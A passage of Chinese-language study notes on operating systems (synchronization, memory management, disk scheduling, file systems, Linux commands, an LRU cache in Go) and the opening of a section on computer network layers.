    down(&s[i]); // 只有收到通知之后才可以开始吃，否则会一直等下去
}

void put_two(i) {
    down(&mutex);
    state[i] = THINKING;
    check(LEFT); // 尝试通知左右邻居，自己吃完了，你们可以开始吃了
    check(RIGHT);
    up(&mutex);
}

void eat(int i) {
    down(&mutex);
    state[i] = EATING;
    up(&mutex);
}

// 检查两个邻居是否都没有用餐，如果是的话，就 up(&s[i])，使得 down(&s[i]) 能够得到通知并继续执行
void check(i) {         
    if(state[i] == HUNGRY && state[LEFT] != EATING && state[RIGHT] !=EATING) {
        state[i] = EATING;
        up(&s[i]);
    }
}
```

### 读者-写者问题

允许多个进程同时对数据进行读操作，但是不允许读和写以及写和写操作同时发生。

一个整型变量 count 记录在对数据进行读操作的进程数量，一个互斥量 count_mutex 用于对 count 加锁，一个互斥量 data_mutex 用于对读写的数据加锁。

```c++
typedef int semaphore;
semaphore count_mutex = 1;
semaphore data_mutex = 1;
int count = 0;

void reader() {
    while(TRUE) {
        down(&count_mutex);
        count++;
        if(count == 1) down(&data_mutex); // 第一个读者需要对数据进行加锁，防止写进程访问
        up(&count_mutex);
        read();
        down(&count_mutex);
        count--;
        if(count == 0) up(&data_mutex);
        up(&count_mutex);
    }
}

void writer() {
    while(TRUE) {
        down(&data_mutex);
        write();
        up(&data_mutex);
    }
}
```

# 操作系统内存管理

## 虚拟内存

- 目的是为了让物理内存扩充成更大的逻辑内存，从而让程序获得更多的可用内存

- 为了更好的管理内存，系统将内存抽象成地址空间。
- 每个程序拥有自己的地址空间，这个地址空间被分为多个块，每一块为一页。这些页被映射到物理内存，但不需要映射到连续的物理内存，也不需要所有页都在物理内存中。
- 当引用到不在物理内存中的页时，由硬件执行必要的映射，将缺失的部分装入物理内存并重新执行失败的命令
- 虚拟内存允许内存不用将地址空间中的每一页都映射到物理内存，也就是说一个程序不需要全部调入内存就可以运行。16位地址可以映射64KB地址，32位可以映射4GB地址。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-02-20\virtualaddr.png" alt="img" style="zoom:80%;" />
</div>


## 什么是分页

把内存空间划分为**大小相等且固定的块**，作为主存的基本单位。因为程序数据存储在不同的页面中，而页面又离散的分布在内存中，**因此需要一个页表来记录映射关系，以实现从页号到物理块号的映射。**

访问分页系统中内存数据需要**两次的内存访问** (一次是从内存中访问页表，从中找到指定的物理块号，加上页内偏移得到实际物理地址；第二次就是根据第一次得到的物理地址访问内存取出数据)。

### 分页系统地址映射

内存管理单元（`Memory Management Unit, MMU`）管理着地址空间和物理内存的转换，其中的页表（`Page table`）存储着页（程序地址空间）和页框（物理内存空间）的映射表。

一个虚拟地址分成两个部分，一部分存储页面号，一部分存储偏移量。即（存储页面号+页内偏移量）

下图的页表存放着 16 个页，这 16 个页需要用 4 个比特位来进行索引定位。例如对于虚拟地址（`0010 0000 0000 0100`），前 4 位是存储页面号 2，读取表项内容为（`110 1`），页表项最后一位表示是否存在于内存中，1 表示存在，0表示不存在。后 12 位存储偏移量。这个页对应的页框的地址为 （`110 0000 0000 0100`）。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-02-20\mmu.png" alt="img" style="zoom:60%;" />
</div>


### 页面置换算法

在程序运行过程中，如果要访问的页面不在内存中，就发生**缺页中断**从而将该页调入内存中。此时如果内存已无空闲空间，系统必须从内存中调出一个页面到磁盘对换区中来腾出空间。

页面置换算法和缓存淘汰策略类似，可以将内存看成磁盘的缓存。在缓存系统中，缓存的大小有限，当有新的缓存到达时，需要淘汰一部分已经存在的缓存，这样才有空间存放新的缓存数据。

页面置换算法的主要目标是使页面置换频率最低（也可以说缺页率最低）。

#### 最佳（Optimal replacement algorithm, OPT）

所选择的被换出的页面将是最长时间内不再被访问，通常可以保证获得最低的缺页率。

是一种理论上的算法，因为无法知道一个页面多长时间不再被访问。

#### 最近最久未使用（Least Recently Used，LRU）

虽然无法知道将来要使用的页面情况，但是可以知道过去使用页面的情况。LRU 将最近最久未使用的页面换出。

为了实现 LRU，需要在内存中维护一个所有页面的链表。**当一个页面被访问时，将这个页面移到链表表头**。这样就能保证链表表尾的页面是最近最久未访问的。

因为每次**访问都需要更新链表**，因此这种方式实现的 LRU 代价很高。

#### 最近未使用（Not Recently Used，NRU）

每个页面都有两个状态位：R 与 M，当页面被访问时设置页面的 R=1，当页面被修改时设置 M=1。其中 R 位会定时被清零。可以将页面分成以下四类：

- R=0，M=0
- R=0，M=1
- R=1，M=0
- R=1，M=1

当发生缺页中断时，NRU 算法随机地从类编号最小的非空类中挑选一个页面将它换出。

NRU 优先换出已经被修改的**脏页面（R=0，M=1）**，而不是被频繁使用的**干净页面（R=1，M=0）**

#### 先入先出（First In First Out, FIFO）

选择换出的页面是最先进入的页面。

该算法会将那些经常被访问的页面换出，导致缺页率升高。

#### 第二次机会算法

FIFO 算法可能会把经常使用的页面置换出去，为了避免这一问题，对该算法做一个简单的修改：

- 当页面被访问 (读或写) 时设置该页面的 R 位为 1。
- 需要替换的时候，检查最老页面的 R 位。
- 如果 R 位是 0，那么这个页面既老又没有被使用，可以立刻置换掉；
- 如果是 1，就将 R 位清 0，并把该页面放到链表的尾端，修改它的装入时间使它就像刚装入的一样，然后继续从链表的头部开始搜索。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-02-20\secondchance.png" alt="img" style="zoom:80%;" />
</div>


#### 时钟（Clock）

第二次机会算法需要在链表中移动页面，降低了效率。时钟算法使用环形链表将页面连接起来，再使用一个指针指向最老的页面。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-02-20\clock.png" alt="img" style="zoom:80%;" />
</div>


## 分段

**分页是为了提高内存利用率，而分段是为了满足程序员在编写代码的时候的一些逻辑需求(比如数据共享，数据保护，动态链接等)。**

分段内存管理当中，**地址是二维的，一维是段号，二维是段内地址；其中每个段的长度是不一样的，而且每个段内部都是从0开始编址的**。由于分段管理中，每个段内部是连续内存分配，但是段和段之间是离散分配的，因此也存在一个逻辑地址到物理地址的映射关系，相应的就是段表机制。

![img](https://segmentfault.com/img/bVcSKjR)

虚拟内存采用的是分页技术，也就是将地址空间划分成固定大小的页，每一页再与内存进行映射。

下图为一个编译器在编译过程中建立的多个表，有 4 个表是动态增长的，如果使用分页系统的一维地址空间，动态增长的特点会导致覆盖问题的出现。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-02-20\segment.png" alt="img" style="zoom:80%;" />
</div>


分段的做法是把每个表分成段，**一个段构成一个独立的地址空间**。每个段的长度可以不同，并且可以动态增长。

## 段页式

程序的地址空间划分成多个拥有独立地址空间的段，每个段上的地址空间划分成大小相同的页。这样既拥有分段系统的共享和保护，又拥有分页系统的虚拟内存功能。

### 分页和分段的比较

- 对程序员：分页透明，分段需要程序员显式划分每个段
- 地址空间维度：分页地址是一维的，分段地址是二维（段名+段内地址）的
- 大小是否可以改变：分页不可变，分段可变
- 出现的原因：分页主要用于虚拟内存，从而获得更大的地址空间；分段是为了使程序和数据可以被划分为逻辑上独立的地址空间并且有助于共享和保护

## 内存为什么要分段

内存是随机访问设备，对于内存来说，不需要从头开始查找，只需要直接给出地址即可。内存的分段是从 `8086 CPU` 开始的，8086 的 CPU 还是 16 位的寄存器宽，16 位的寄存器可以存储的数字范围是 2 的 16 次方，即 64 KB，8086 的 CPU 还没有 `虚拟地址`，只有物理地址，也就是说，**如果两个相同的程序编译出来的地址相同，那么这两个程序是无法同时运行的。为了解决这个问题，操作系统设计人员提出了让 CPU 使用 `段基址 + 段内偏移` 的方式来访问任意内存。这样的好处是让程序可以 `重定位`，这也是内存为什么要分段的第一个原因**。

> 那么什么是重定位呢？

简单来说就是将程序中的指令地址改为另一个地址，地址处存储的内容还是原来的。

CPU 采用段基址 + 段内偏移地址的形式访问内存，就需要提供专门的寄存器，这些专门的寄存器就是 **CS、DS、ES 等**，如果你对寄存器不熟悉，可以看我的这一篇文章。

也就是说，程序中需要用到哪块内存，就需要先加载合适的段到段基址寄存器中，再给出相对于该段基址的段偏移地址即可。CPU 中的地址加法器会将这两个地址进行合并，从地址总线送入内存。

8086 的 CPU 有 20 根地址总线，最大的寻址能力是 1MB，而段基址所在的寄存器宽度只有 16 位，最大为你 64 KB 的寻址能力，64 KB 显然不能满足 1MB 的最大寻址范围，所以就要把内存分段，每个段的最大寻址能力是 64KB，但是仍旧不能达到最大 1 MB 的寻址能力，所以这时候就需要 `偏移地址`的辅助，偏移地址也存入寄存器，同样为 64 KB 的寻址能力，这么一看还是不能满足 1MB 的寻址，所以 CPU 的设计者对地址单元动了手脚，将段基址左移 4 位，然后再和 16 位的段内偏移地址相加，就达到了 1MB 的寻址能力。**所以内存分段的第二个目的就是能够访问到所有内存**。

## 什么是交换空间？

操作系统把物理内存(physical RAM)分成一块一块的小内存，每一块内存被称为**页(page)**。当内存资源不足时，**Linux把某些页的内容转移至硬盘上的一块空间上，以释放内存空间**。硬盘上的那块空间叫做**交换空间**(swap space),而这一过程被称为交换(swapping)。**物理内存和交换空间的总容量就是虚拟内存的可用容量。**

用途：

- 物理内存不足时一些不常用的页可以被交换出去，腾给系统。
- 程序启动时很多内存页被用来初始化，之后便不再需要，可以交换出去。

## 什么是缓冲区溢出？有什么危害？

缓冲区溢出是指当计算机向缓冲区填充数据时超出了缓冲区本身的容量，溢出的数据覆盖在合法数据上。

危害有以下两点：

- 程序崩溃，导致拒绝服务
- 跳转并且执行一段恶意代码

造成缓冲区溢出的主要原因是程序中没有仔细检查用户输入。

# 操作系统之磁盘

## 磁盘结构

- 盘面（Platter）：一个磁盘有多个盘面；
- 磁道（Track）：盘面上的圆形带状区域，一个盘面可以有多个磁道；
- 扇区（Track Sector）：磁道上的一个弧段，一个磁道可以有多个扇区，它是最小的物理储存单位，目前主要有 512 bytes 与 4 K 两种大小；
- 磁头（Head）：与盘面非常接近，能够将盘面上的磁场转换为电信号（读），或者将电信号转换为盘面的磁场（写）；
- 制动手臂（Actuator arm）：用于在磁道之间移动磁头；
- 主轴（Spindle）：使整个盘面转动。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-02-25\disk.png" alt="img" style="zoom:80%;" />
</div>


## 磁盘调度算法

读写一个磁盘块的时间的影响因素有：

- 旋转时间（主轴转动盘面，使得磁头移动到适当的扇区上）
- 寻道时间（制动手臂移动，使得磁头移动到适当的磁道上）
- 实际的数据传输时间

其中，寻道时间最长，因此磁盘调度的主要目标是使磁盘的平均寻道时间最短。

### 先来先服务（First Come First Served, FCFS）

按照磁盘请求的顺序进行调度。

优点是公平和简单。缺点也很明显，因为未对寻道做任何优化，使平均寻道时间可能较长。

### 最短寻道时间优先（Shortest Seek Time First, SSTF）

优先调度与当前磁头所在磁道距离最近的磁道。

虽然平均寻道时间比较低，但是不够公平。如果新到达的磁道请求总是比一个在等待的磁道请求近，那么在等待的磁道请求会一直等待下去，也就是出现饥饿现象。具体来说，两端的磁道请求更容易出现饥饿现象。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-02-25\SSTF.png" alt="img" style="zoom:80%;" />
</div>


### 电梯算法（SCAN）

电梯总是保持一个方向运行，直到该方向没有请求为止，然后改变运行方向。

电梯算法（扫描算法）和电梯的运行过程类似，总是按一个方向来进行磁盘调度，直到该方向上没有未完成的磁盘请求，然后改变方向。

因为考虑了移动方向，因此所有的磁盘请求都会被满足，解决了 SSTF 的饥饿问题。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-02-25\SCAN.png" alt="img" style="zoom:80%;" />
</div>
## RAID 的不同级别

RAID 称为 `磁盘冗余阵列`，简称 `磁盘阵列`。利用虚拟化技术把多个硬盘结合在一起，成为一个或多个磁盘阵列组，目的是提升性能或数据冗余。

RAID 有不同的级别

- RAID 0 - 无容错的条带化磁盘阵列
- RAID 1 - 镜像和双工
- RAID 2 - 内存式纠错码
- RAID 3 - 比特交错奇偶校验
- RAID 4 - 块交错奇偶校验
- RAID 5 - 块交错分布式奇偶校验
- RAID 6 - P + Q冗余

# 操作系统之文件系统

## linux的文件系统

- `superblock`：记录文件系统的整体信息，包括inode和block的总量，使用量和剩余量，以及文件系统的格式及相关信息等；
- `block bitmap`：记录block是否被使用的位图
- `inode`：一个文件占用一个inode，记录文件的属性，同时记录此文件的内容所在的block编号；
- `block`：记录文件的内容，文件太大时，会占用多个block

![img](../assets/post/2018-04-02/BSD_disk.png)

**文件系统如何找到文件？**

- 根据文件名，通过Dictionary的对应关系，找到文件对用的inode number
- 再根据inode number读取到文件的inode table
- 根据inode table中的pointer读取到相应的blocks

## Linux文件是怎么存储的

一个文件由目录项，inode和数据块组成。

- 目录项：包括文件名和inode节点号
- inode：又称为文件索引节点，包含文件的基础信息以及数据块的指针
- 数据块：包含文件的具体内容

硬盘的最小存储单元为”扇区sector“，每个扇区存储512字节（0.5KB），操作系统读取硬盘时，一次性连续读取多个扇区，即一个”块block“。每个块最常见的大小为4K，即8个扇区

inode存储文件的元信息，以及文件数据block的位置。

- 一个文件可以被存储在一个或者多个block中
- 每个文件都会并且只会占用一个inode，inode可以指向该文件所在的block
- 想读取该文件，需要通过**目录项**的文件名来指向正确的inode号码才能读取
  - **目录项：**当新建一个目录时，文件系统会分配一个inode和至少一个block给该目录。其中inode记录目录的相关权限和属性，并记录分配到的那块block目录。而block则是记录在这个目录下的文件名和其对应的inode号码数据，这就是数据项

## 提高文件系统性能的方式

访问磁盘的效率要比内存慢很多，是时候又祭出这张图了

![img](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a62ac3982ff84a12af120b76dd8da95b~tplv-k3u1fbpfcp-watermark.awebp)

所以磁盘优化是很有必要的，下面我们会讨论几种优化方式:

### 高速缓存

最常用的减少磁盘访问次数的技术是使用 `块高速缓存(block cache)` 或者 `缓冲区高速缓存(buffer cache)`。高速缓存指的是一系列的块，它们在逻辑上属于磁盘，但实际上基于性能的考虑被保存在内存中。

管理高速缓存有不同的算法，常用的算法是：检查全部的读请求，查看在高速缓存中是否有所需要的块。如果存在，可执行读操作而无须访问磁盘。如果检查块不在高速缓存中，那么首先把它读入高速缓存，再复制到所需的地方。之后，对同一个块的请求都通过`高速缓存`来完成。

高速缓存的操作如下图所示

![img](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/c08c9eaae7d44d76975cb790dbbff765~tplv-k3u1fbpfcp-watermark.awebp)

由于在高速缓存中有许多块，所以需要某种方法快速确定所需的块是否存在。常用方法是将设备和磁盘地址进行散列操作。然后在散列表中查找结果。具有相同散列值的块在一个链表中连接在一起（这个数据结构是不是很像 HashMap?），这样就可以沿着冲突链查找其他块。

如果高速缓存`已满`，此时需要调入新的块，则要把原来的某一块调出高速缓存，如果要调出的块在上次调入后已经被修改过，则需要把它写回磁盘。这种情况与分页非常相似。

### 块提前读

第二个明显提高文件系统的性能是**在需要用到块之前试图提前将其写入高速缓存从而提高命中率**。许多文件都是`顺序读取`。如果请求文件系统在某个文件中生成块 k，文件系统执行相关操作并且在完成之后，会检查高速缓存，以便确定块 k + 1 是否已经在高速缓存。如果不在，文件系统会为 k + 1 安排一个预读取，因为文件希望在用到该块的时候能够直接从高速缓存中读取。

当然，块提前读取策略只适用于实际顺序读取的文件。对随机访问的文件，提前读丝毫不起作用。甚至还会造成阻碍。

### 减少磁盘臂运动

高速缓存和块提前读并不是提高文件系统性能的唯一方法。另一种重要的技术是**把有可能顺序访问的块放在一起，当然最好是在同一个柱面上，从而减少磁盘臂的移动次数**。当写一个输出文件时，文件系统就必须按照要求一次一次地分配磁盘块。如果用位图来记录空闲块，并且整个位图在内存中，那么选择与前一块最近的空闲块是很容易的。如果用空闲表，并且链表的一部分存在磁盘上，要分配紧邻的空闲块就会困难很多。

不过，即使采用空闲表，也可以使用 `块簇` 技术。即不用块而用连续块簇来跟踪磁盘存储区。如果一个扇区有 512 个字节，有可能系统采用 1 KB 的块（2 个扇区），但却按每 2 块（4 个扇区）一个单位来分配磁盘存储区。这和 2 KB 的磁盘块并不相同，因为在高速缓存中它仍然使用 1 KB 的块，磁盘与内存数据之间传送也是以 1 KB 进行，但在一个空闲的系统上顺序读取这些文件，寻道的次数可以减少一半，从而使文件系统的性能大大改善。若考虑旋转定位则可以得到这类方法的变体。在分配块时，系统尽量把一个文件中的连续块存放在同一个柱面上。

在使用 inode 或任何类似 inode 的系统中，另一个性能瓶颈是，读取一个很短的文件也需要两次磁盘访问：**一次是访问 inode，一次是访问块**。通常情况下，inode 的放置如下图所示

![img](https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/98d93b28049444348a2fb25650dc3b6b~tplv-k3u1fbpfcp-watermark.awebp)

其中，全部 inode 放在靠近磁盘开始位置，所以 inode 和它所指向的块之间的平均距离是柱面组的一半，这将会需要较长时间的寻道时间。

一个简单的改进方法是，在磁盘中部而不是开始处存放 inode ，此时，在 inode 和第一个块之间的寻道时间减为原来的一半。另一种做法是：将磁盘分成多个柱面组，每个柱面组有自己的 inode，数据块和空闲表，如上图 b 所示。

当然，只有在磁盘中装有磁盘臂的情况下，讨论寻道时间和旋转时间才是有意义的。现在越来越多的电脑使用 `固态硬盘(SSD)`，对于这些硬盘，由于采用了和闪存同样的制造技术，使得随机访问和顺序访问在传输速度上已经较为相近，传统硬盘的许多问题就消失了。但是也引发了新的问题。

### 磁盘碎片整理

在初始安装操作系统后，文件就会被不断的创建和清除，于是磁盘会产生很多的碎片，在创建一个文件时，它使用的块会散布在整个磁盘上，降低性能。删除文件后，回收磁盘块，可能会造成空穴。

磁盘性能可以通过如下方式恢复：移动文件使它们相互挨着，并把所有的至少是大部分的空闲空间放在一个或多个大的连续区域内。Windows 有一个程序 `defrag` 就是做这个事儿的。Windows 用户会经常使用它，SSD 除外。

磁盘碎片整理程序会在让文件系统上很好地运行。Linux 文件系统（特别是 ext2 和 ext3）由于其选择磁盘块的方式，在磁盘碎片整理上一般不会像 Windows 一样困难，因此很少需要手动的磁盘碎片整理。而且，固态硬盘并不受磁盘碎片的影响，事实上，在固态硬盘上做磁盘碎片整理反倒是多此一举，不仅没有提高性能，反而磨损了固态硬盘。所以碎片整理只会缩短固态硬盘的寿命。

# 操作系统之面试题

## Linux常用命令

```
ls			显示文件或者目录
	-l		列出文件详细信息
	-a		列出当前目录下所有文件及目录，包括隐藏的
mkdir		创建目录
	-p		创建目录，如果没有父目录，则创建它
cd			切换目录
touch		创建空文件
lsof -i:port				查看端口被哪个进程占用
netstat -anp|grep port		查看端口被哪个进程占用
ps -aux|grep process		查看进程
ps -aux | sort -k4nr | head -K		查看占用内存最高的k个进程
ps -aux | sort -k3nr | head -K		查看占用CPU最高的k个进程

tail -n 10		显示最后10行
tail -n +10		从第10行显示到最后
head -n 10		显示前面10行
cat test.log | tail -n +10 | head -n 15		从第10行显示到第15行

chmod [u/g/o/a] [+/-/=][r/w/x] file		文件权限管理
	user, group, other, all	
	增加，取消，取消之前的
	读取4
	写入2
	执行1
	0

tar -xvf file.tar		解压tar包
tar -zxvf file.tar.gz	解压tar.gz
tar -jxvf file.tar.bz2	解压tar.bz2
tar -Zxvf file.tar.Z	解压tar.Z

vi /etc/profile
source /etc/profile

top/htop				监控系统的cpu，内存等运行情况

sudo ufw enable			开启防火墙
sudo ufw default deny	关闭所有外部访问

sudo ufw disable		关闭防火墙
sudo ufw status			查看防火墙状态

sudo ufw allow 80		允许外部访问80端口
sudo ufw delete allow 80	删除允许访问

whatis					命令的作用
whereis					命令的位置
find					搜索
find <指定目录><指定条件><指定动作>,   find / -name 'interfaces'
```

## 文件处理命令（待学习）

### grep

文本过滤器，可以使用正则表达式搜索文本，并把匹配的行打印出来。

### sed

流编辑器，默认只处理模式空间，不处理原数据。处理时，把当前处理的行存储在临时缓冲区，称为“模式空间”（pattern space），接着用sed命令处理缓冲区中的内容，处理完成后，把缓冲区的内容送到屏幕，接着处理下一行，直到文件末尾。文件内容并没有改变，除非使用重定向存储输出。

### awk

文本分析工具，相对于grep的查找，sed的编辑，awk在数据分析和生成数据显得尤为强大。awk把文件逐行读入，以空格为默认分隔符将每行切片，切开的部分进行分析处理。

## 文件的三种时间

- `mtime(Modification)`：更改文件内容时会更新这个时间
- `atime(Access)`：读取文件，比如使用less，more读取时会更新这个时间
- `ctime(Change)`：在修改权限，写入文件、更改所有者、权限或者链接设置时随着inode的内容更改而更改，即文件状态最后一次被更改的时间

## shell脚本

待学习

## 硬链接和软连接

### 硬链接

`ln [sourceFile] [linkName]`

A是B的硬链接，则A的目录项中的inode节点号于B的目录项中的inode节点号相同，即一个inode节点对应两个不同的文件名，A和B对于系统来说是完全平等的。

如果删除了其中一个，对另一个没有影响。每增加一个硬链接的文件名，inode节点上的链接数增加1，每删除一个就减1，直到为0，inode节点和对应的block被回收。

**注意：**文件和文件名是两个不同的东西，`rm A`删除的只是A这个文件名，但是其对应的数据块（文件）并没有被删除，文件只有在inode节点链接数减少为0时才会被删除。

### 软连接

`ln -s [sourceFile] [linkName]`

A是B的软连接，A的目录项中的inode节点号和B的目录项中的inode节点号不同，A和B指向不同的inode，继而指向不同的数据库。但是A的数据块中存储的是B的路径名（可以根据这个路径名找到B的目录项）。A和B之间是“主从”关系，如果B被删除了，A依然存在，但指向的是一个无效链接。

### 区别

#### 硬链接

- 不能对目录创建硬链接，原因有几种，最重要的是：文件系统不能存在链接环（目录创建时的".."除外，这个系统可以识别出来）,存在环的后果会导致例如文件遍历等操作的混乱(du，pwd等命令的运作原理就是基于文件硬链接，顺便一提，ls -l结果的第二列也是文件的硬链接数，即inode节点的链接数)

- 不能对不同的文件系统创建硬链接,即两个文件名要在相同的文件系统下。

- 不能对不存在的文件创建硬链接，由原理即可知原因。

#### 软连接

- 可以对目录创建软连接，遍历操作会忽略目录的软连接。
- 可以跨文件系统
- 可以对不存在的文件创建软连接，因为保存的只是一个字符串

## LRU实现

使用双向链表+hashmap来进行实现。

采用双向链表的原因是：如果是单向链表，则删除节点的时候从表头开始遍历查找，效率为O(N)，采用双向链表可以直接改变节点的前驱的指针指向进行删除，可以达到O(1)的效率。

同时使用hashmap来保存节点的key,value值便于能在O(logN)的时间查找元素，进行get操作。

应该具有的操作：

- `set(key,value)`：如果key在hashmap中存在，则先重置对应的value值，然后获取对应的节点cur，将cur节点从链表中删除，并移动到链表的头部；如果不存在，则新建一个节点，并将该节点放置到链表的头部。当Cache存满的时候，将链表最后一个节点删除即可。
- `get(key)`：如果key在hashmap中存在，则把对应的节点放在链表头部，并返回对应的value值；如果不存在，则返回-1；

```go
type LRUCache struct {
	Cap    int //容量
	Bucket map[int]*Node
	Head   *Node //头节点
	Tail   *Node //尾节点
}
type Node struct {
	Key  int
	Val  int
	Pre  *Node
	Next *Node
}

func LruConstructor(capacity int) LRUCache {
	return LRUCache{
		Cap:    capacity,
		Bucket: make(map[int]*Node, capacity),
	}
}

func (this *LRUCache) Get(key int) int {
	if item, ok := this.Bucket[key]; ok {
		this.RefreshNode(item)
		return item.Val
	} else {
		return -1
	}
}

func (this *LRUCache) Put(key int, value int) {

	if item, ok := this.Bucket[key]; !ok {
		if len(this.Bucket) >= this.Cap {
			this.RemoveNode(this.Head)
		}
		node := &Node{
			Key:  key,
			Val:  value,
			Pre:  nil,
			Next: nil,
		}
		this.AddNode(node)
		this.Bucket[key] = node
	} else {
		item.Val = value
		this.RefreshNode(item)
	}
}

//添加节点  往表尾添加最近新增的node
func (this *LRUCache) AddNode(node *Node) {

	if this.Tail != nil {
		this.Tail.Next = node
		node.Pre = this.Tail
		node.Next = nil
	}
	this.Tail = node
	if this.Head == nil {
		this.Head = node
		this.Head.Next = nil
	}
	this.Bucket[node.Key] = node
}

func (this *LRUCache) RemoveNode(node *Node) {
	if node == this.Tail {
		this.Tail = this.Tail.Pre
	} else if node == this.Head {
		this.Head = this.Head.Next
	} else {
		node.Pre.Next = node.Next
		node.Next.Pre = node.Pre
	}
	delete(this.Bucket, node.Key)
}

//将已存在的节点移到表尾
func (this *LRUCache) RefreshNode(node *Node) {

	//如果已经在表尾 则直接返回
	if this.Tail == node {
		return
	}
	this.RemoveNode(node)
	this.AddNode(node)
}

func (this *LRUCache) PrintLRU() {

	root := this.Head
	for root != nil {
		fmt.Printf("current node key is[%+v],value is [%+v]\n", root.Key, root.Val)
		root = root.Next
	}
	return
}

```

## 现代多核CPU计算机如果保持数据一致性

32位处理器和64位处理器使用**MESI(修改、独占、共享、无效)**控制协议去维护内部缓存和其它处理器缓存的一致性。

说明：多个CPU从主内存读取了同一份数据到各自的高速缓存（L1、L2或其它），当其中一个CPU修改了数据往主内存同步时，其它CPU会通过**总线嗅探机制**感知到数据的变化，从而让自己缓存的数据无效，当感知到变化的CPU再往主内存写数据时，会先从主内存读取一份计算再回写。

## 字节序

- 大端字节序：高位字节在低位内存，地位字节在高位内存，符合人类阅读习惯。网络字节序
- 小端字节序：与大端相反。x86
- 为什么要有大小端字节序：计算机电路先处理低位字节，效率比较高，因为计算都是从低位开始的。所以，计算机的内部处理都是小端字节序；但是，人类还是习惯读写大端字节序。所以，除了计算机的内部处理，其他的场合几乎都是大端字节序，比如网络传输和文件储存。一般只有读取外部数据的时候才需要考虑字节序 。
- 如何判断：将一个多字节的值（4字节整数）存入内存（即赋值给一个变量），然后用指针取其首地址所对应的字节（即低地址的一个字节），判断该字节存放的高位还是地位，如果是高位则是大端，否则是小端。

## 深拷贝、浅拷贝、零拷贝

#### 浅拷贝

指只复制某个对象的指针，而不复制对象本身，新旧对象共享同一块内存。即仅仅是名字不同，对其中任何一个对象的改动都会影响另一个对象。

#### 深拷贝

会另外构造一摸一样的对象，不共享内存，即源对象与拷贝对象之间互相独立，其中任何一个对象的改动都不会对另外一个对象造成影响。

#### 零拷贝

零拷贝主要的任务是避免CPU将数据从一块存储拷贝到另一块存储，主要就是利用各种零拷贝技术，避免让CPU做大量的数据拷贝任务，避免不必要的拷贝。这样可以让系统资源的利用更加有效。

零拷贝技术常见于linux中，例如用户空间到内核空间的拷贝，这个是没有必要的，可以采用零拷贝技术，通过mmap，直接将内核空间的数据通过映射的方法映射到用户空间，即物理上共用这段数据。

# 计算机网络分层

## 概述

### 网络

网络把主机连接起来，而互连网（internet）是把多种不同的网络连接起来，因此互连网是网络的网络。而互联网（Internet）是全球范围的互连网。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\network-of-networks.png" alt="img" style="zoom:80%;" />
</div>

### ISP

互联网服务提供商 ISP 可以从互联网管理机构获得许多 IP 地址，同时拥有通信线路以及路由器等联网设备，个人或机构向 ISP 缴纳一定的费用就可以接入互联网。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\isp1.png" alt="img" style="zoom:50%;" />
</div>

目前的互联网是一种多层次 ISP 结构，ISP 根据覆盖面积的大小分为第一层 ISP、区域 ISP 和接入 ISP。互联网交换点 IXP 允许两个 ISP 直接相连而不用经过第三个 ISP。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\isp2.png" alt="img" style="zoom:50%;" />
</div>

### 主机之间的通信方式

客户-服务器（C/S）：客户是服务的请求方，服务器是服务的提供方

对等（P2P）：不区分客户和服务器

### 电路交换和分组交换

- 电路交换：电路交换用于电话通信系统，两个用户要通信之前需要建立一条专用的物理链路，并且在整个通信过程中始终占用该链路。由于通信的过程中不可能一直在使用传输线路，因此电路交换对线路的利用率很低，往往不到 10%。
- 分组交换：每个分组都有首部和尾部，包含了源地址和目的地址等控制信息，在同一个传输线路上同时传输多个分组互相不会影响，因此在同一条传输线路上允许同时传输多个分组，也就是说分组交换不需要占用传输线路。
  - 在一个邮局通信系统中，邮局收到一份邮件之后，先存储下来，然后把相同目的地的邮件一起转发到下一个目的地，这个过程就是存储转发过程，分组交换也使用了存储转发过程。

### 时延

总时延 = 排队时延 + 处理时延 + 传输时延 + 传播时延

- 排队时延：分组在路由器的输入队列和输出队列中排队等待的时间，取决于网络当前的通信量
- 处理时延：主机或路由器收到分组时进行处理所需要的时间，例如分析首部、从分组中提取数据、进行差错检验或查找适当的路由等。
- 传输时延：主机或路由器传输数据帧所需要的时间。
- 传播时延：电磁波在信道中传播所需要花费的时间，电磁波传播的速度接近光速。

## 计算机网络体系结构

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\layers2.png" alt="img" style="zoom:100%;" />
</div>

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\layers.png" alt="img" style="zoom:50%;" />
</div>

- **物理层（比特Bit）**：考虑的是怎样在传输媒体上传输数据比特流，而不是指具体的传输媒体。物理层的作用是尽可能屏蔽传输媒体和通信手段的差异，使数据链路层感觉不到这些差异。
- `RJ45， IEEE802.3(中继器，集线器)`
- **数据链路层（帧Frame）**：网络层针对的还是主机之间的数据传输服务，而主机之间可以有很多链路，链路层协议就是为同一链路的主机提供数据传输服务。数据链路层把网络层传下来的分组封装成帧。
- `PPP,FR,HDLC,VLAN,MAC(网桥，交换机)`
- **网络层（包Packet）**：为主机提供数据传输服务。而传输层协议是为主机中的进程提供数据传输服务。网络层把传输层传递下来的报文段或者用户数据报封装成分组。
- `IP,ICMP,IGMP,ARP,RARP,OSPF,IPX,RIP,IGRP(路由器)`
- **传输层（段Segment）**：为进程提供通用数据传输服务。由于应用层协议很多，定义通用的传输层协议就可以支持不断增多的应用层协议。运输层包括两种协议：
  - 传输控制协议 TCP，提供面向连接、可靠的数据传输服务，数据单位为报文段；
  - 用户数据报协议 UDP，提供无连接、尽最大努力的数据传输服务，数据单位为用户数据报。
  - TCP 主要提供完整性服务，UDP 主要提供及时性服务。
- `TCP,UDP,SPX(通常用于游戏联机)`
- **应用层（报文Message）**为特定应用程序提供数据传输服务，例如 HTTP、DNS 等协议。
